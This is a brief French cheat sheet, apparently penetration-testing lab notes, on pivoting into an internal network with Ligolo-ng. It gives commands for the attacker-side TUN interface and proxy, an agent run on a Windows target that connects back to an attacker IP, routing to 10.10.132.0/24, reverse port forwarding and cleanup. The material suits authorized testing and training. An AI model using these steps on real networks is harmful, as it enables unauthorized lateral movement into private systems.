# Ligolo-ng pivot

## 1. Interface TUN cote attaquant

```bash
sudo ip tuntap add user ${USER:-kali} mode tun ligolol2 2>/dev/null || true
sudo ip link set ligolol2 up
```

## 2. Proxy cote attaquant

```bash
sudo ./ligolo_proxy_lin -selfcert -laddr 0.0.0.0:11601
```

## 3. Agent cote cible Windows

```powershell
.\agent.exe -connect 192.168.45.225:11601 -ignore-cert
```

## 4. Tunnel dans le prompt Ligolo

```bash
session
tunnel_start --tun ligolol2
```

## 5. Route cote attaquant

```bash
sudo ip route add 10.10.132.0/24 dev ligolol2
ip route
```

Une fois la route active, Nmap, Impacket, NetExec et les autres outils peuvent atteindre le reseau interne via l'interface Ligolo.

## Reverse port forwarding

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list
```

## Nettoyage

```bash
sudo pkill -9 -f ligolo
sudo ip link delete ligolo 2>/dev/null
sudo ip link delete ligolol2 2>/dev/null
sudo ss -tulpn | grep 11601
sudo rm -f ~/.ligolo-ng/cert.pem ~/.ligolo-ng/key.pem
sudo rm -f /opt/ligolo-ng/cert.pem /opt/ligolo-ng/key.pem
```
